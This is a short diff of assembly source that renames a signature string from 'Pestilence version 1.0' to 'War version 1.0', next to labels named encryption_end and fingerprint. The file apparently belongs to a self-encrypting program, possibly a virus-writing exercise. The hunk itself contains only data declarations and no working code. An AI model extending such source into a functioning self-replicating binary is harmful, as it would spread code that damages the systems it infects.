@@ -1142,7 +1142,7 @@ data_name:
 encryption_end:
 	db 0
 signature:
-	db 'Pestilence version 1.0 (c)oded by gdelabro',0, ' - '
+	db 'War version 1.0 (c)oded by gdelabro', ' - '
 fingerprint:
 	db '00000000', 0
 end:
